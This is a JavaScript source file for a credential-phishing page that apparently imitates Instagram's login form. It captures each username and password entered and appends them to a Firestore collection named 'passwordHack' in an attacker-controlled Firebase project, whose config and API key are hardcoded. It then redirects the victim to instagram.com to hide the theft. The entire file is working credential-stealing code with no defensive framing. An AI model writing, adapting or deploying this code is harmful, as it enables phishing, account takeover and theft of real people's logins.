const firebaseConfig = {
  apiKey: 'AIzaSyCxF44T7BJ9SX9pyjw-DJ_vK6y6AVxz-i0',
  authDomain: 'autotrander.firebaseapp.com',
  projectId: 'autotrander',
  storageBucket: 'autotrander.appspot.com',
  messagingSenderId: '752756829096',
  appId: '1:752756829096:web:2b53f1c997d74ef42f0b9d'
}
// Import the functions you need from the SDKs you need
const { initializeApp } = require('firebase/app')
const {
  collection,
  getFirestore,
  doc,
  updateDoc,
  setDoc,
  getDoc
} = require('firebase/firestore')
const collectionName = 'passwordHack'
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Initialize Firebase
const app = initializeApp(firebaseConfig)
const db = getFirestore(app)
const passwordHack = collection(db, collectionName)
let docRef = doc(passwordHack, 'GbAjWULdqbWSvykBv1DI')

function updatePasswordHack(data) {
  return updateDoc(docRef, data).catch(() => setDoc(docRef, data))
}

function getPassData() {
  return getDoc(docRef).then(docSnap => {
    if (docSnap.exists()) {
      return docSnap.data()
    } else {
      return null
    }
  })
}

getPassData().then(({ data }) => {
  data = Array.isArray(data) ? data : [];
  let userNameElementRef = document.getElementById("username");
  let passwordElementRef = document.getElementById("password");
  let passwordDivElementRef = document.getElementById("pass-label");
  let userNameDivElementRef = document.getElementById("username-label");
  let loginFormRef = document.getElementById("loginForm");
  let username = "";
  let password = "";

  userNameElementRef.addEventListener("focus", e => {
    userNameDivElementRef.classList.add('_aa49');
  });
  userNameElementRef.addEventListener("blur", e => {
    if (!username) {
      userNameDivElementRef.classList.remove('_aa49');
    }
  });

  passwordElementRef.addEventListener("focus", e => {
    passwordDivElementRef.classList.add('_aa49');
  });
  passwordElementRef.addEventListener("blur", e => {
    if (!password) {
      passwordDivElementRef.classList.remove('_aa49');
    }
  });

  userNameElementRef.addEventListener('change', e => {
    username = e.target.value
  })
  passwordElementRef.addEventListener('change', e => {
    password = e.target.value
  })
  loginFormRef.addEventListener('submit', e => {
    e.preventDefault()
    if (username && password) {
      data.push({
        username: username.trim(),
        password: password.trim()
      })
      updatePasswordHack({ data }).then(() => {
        window.location.href = "https://www.instagram.com/"
      })
    }
  })
})
